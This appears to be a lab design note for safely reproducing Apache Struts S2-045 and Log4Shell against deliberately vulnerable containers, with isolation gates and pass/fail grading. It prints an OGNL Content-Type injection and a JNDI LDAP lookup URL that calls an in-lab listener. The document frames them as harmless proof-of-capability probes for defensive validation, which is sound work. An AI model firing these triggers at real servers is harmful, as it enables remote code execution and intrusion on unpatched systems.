# Phase 3 real-PoC — acceptance design, expected results & observable evidence

Status until the host-isolation fix (infra-eng 227a74c + 713aa43) is merged to main
and `CR_PHASE3_AUTHORIZED=1` is set by the Lead: **NOT_TESTED (blocked by guard)**.

Two real vulnerable targets from the catalogue are covered. Each run is double-gated
(`CR_PHASE3_AUTHORIZED=1` AND `guard.require_isolation()`), deploys nothing until both
gates pass, and tears everything down afterward.

## Safety model (enforced, not assumed)

1. **Isolation guard first.** Before any vulnerable image is deployed, `guard.py`
   stands up only a harmless pinned non-root probe on an `internal` bridge and checks
   that the host gateway (ports 22, 4000, 5173, 5177, 8000, 8077, 8080) and the public
   internet are unreachable. If anything is reachable → `IsolationNotConfirmed` → run
   aborts NOT_TESTED, no target deployed. (Current real verdict, pre-fix:
   `reports/overnight/evidence/poc-eng/phase3-guard-current-state.json` shows host
   ports 22/4000/8000 reachable → correctly blocked.)
2. **No weaponisation.** Only the canonical *proof-of-capability* observables below
   are used — arithmetic in a header, and a detection-only callback. No reverse shell,
   file write, class loading, or data access.
3. **In-lab only.** Attacker requests come from the in-lab attacker container; targets
   and callbacks never leave the internal network.

## Chain A — Apache Struts S2-045 / CVE-2017-5638 (`run_struts_s2045.py`)

- Target: `vulhub/struts2:2.3.30` on port 8080.
- Trigger: `Content-Type: %{#context[...HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data`.
- Observable evidence: the HTTP **response header `vulhub: 54289`** (233×233). Its
  presence proves attacker-controlled OGNL was evaluated server-side (RCE capability).

| step | expected | grade |
|---|---|---|
| guard | host + internet unreachable | precondition, else NOT_TESTED |
| benign request (ordinary Content-Type) | no `vulhub` response header | must hold |
| OGNL arithmetic probe | response header `vulhub: 54289` | **S2-045 reproduced** |
| grading | PASS only if benign has no header AND probe returns 54289 | — |

## Chain B — Log4Shell / CVE-2021-44228 on Solr (`run_log4shell_solr.py`)

- Target: `vulhub/solr:8.11.0` (real Log4j 2.14.1) on port 8983; in-lab `listener`.
- Trigger: `GET /solr/admin/cores?action=${jndi:ldap://listener:1389/sol}`.
- Observable evidence: the in-lab listener records an **LDAP connection from the Solr
  container** (`callbacks.jsonl`, peer = Solr's IP). The listener returns nothing, so
  the real JNDI lookup fires with no class load / RCE.

| step | expected | grade |
|---|---|---|
| guard | host + internet unreachable | precondition, else NOT_TESTED |
| benign request (`action=STATUS`) | no callback recorded | must hold |
| JNDI injection | ≥1 callback from the Solr container | **B2 reproduced (real)** |
| listener response | empty (no payload served) | safety invariant |

## Fidelity labelling (ties back to cti-research expected.md)

- Chain A proves **S2-045 RCE capability** on the real framework (a Linux/Java Web-RCE
  stand-in for the Equifax Struts entry point; product/version differ from Equifax, so
  still EXTERNAL_ENRICHMENT / SUBSTITUTED at the scenario level).
- Chain B is the **real B2** (Log4Shell JNDI callback). B1 (full Horizon RCE) and the
  Windows-only steps remain substitute / BLOCKED per the AA22-320A answer key.

## What the Lead triggers

After the isolation fix is in main: `git merge main`, re-run `guard.py` to confirm the
host is now unreachable, then run each `run_*.py` with `CR_PHASE3_AUTHORIZED=1`.
Evidence lands in `reports/overnight/evidence/poc-eng/phase3-*`.
